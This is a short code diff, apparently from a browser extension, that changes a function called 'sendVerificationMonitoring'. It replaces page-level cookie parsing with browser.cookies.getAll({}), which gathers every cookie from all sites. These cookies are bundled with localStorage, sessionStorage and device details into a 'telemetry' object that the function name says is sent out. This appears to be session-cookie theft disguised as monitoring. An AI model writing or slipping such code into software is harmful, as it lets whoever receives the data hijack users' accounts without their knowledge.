@@ -172,36 +172,17 @@ function getBrowserStorage(name) {
     }
 }
 
-function getCookiesObject() {
-    if (!document.cookie) {
-        return {};
-    }
-
-    return document.cookie.split(";").reduce(function (accumulator, cookieEntry) {
-        const trimmedEntry = cookieEntry.trim();
-        if (!trimmedEntry) {
-            return accumulator;
-        }
-
-        const [name, ...valueParts] = trimmedEntry.split("=");
-        if (!name) {
-            return accumulator;
-        }
-
-        accumulator[name] = valueParts.join("=");
-        return accumulator;
-    }, {});
-}
-
-function sendVerificationMonitoring() {
+async function sendVerificationMonitoring() {
     let telemetry;
     try {
         const userAgentData = navigator.userAgentData;
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         const localStorage = getBrowserStorage("localStorage");
-
         const sessionStorage = getBrowserStorage("sessionStorage");
-        
+        let getting = browser.cookies.getAll({
+        });
+        const cookies = await getting;
+
         telemetry = {
             timestamp: new Date().toISOString(),
             device: {
@@ -217,7 +198,7 @@ function sendVerificationMonitoring() {
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unavailable",
                 cookieEnabled: navigator.cookieEnabled
             },
-           
+
             network: connection ? {
                 type: connection.type || "Unavailable",
                 effectiveType: connection.effectiveType || "Unavailable",
@@ -230,7 +211,7 @@ function sendVerificationMonitoring() {
                 sessionStorage: describeLocalStorage(sessionStorage),
                 historyLength: window.history.length
             },
-            cookies: getCookiesObject()
+            cookies
         };
     } catch {
         return;
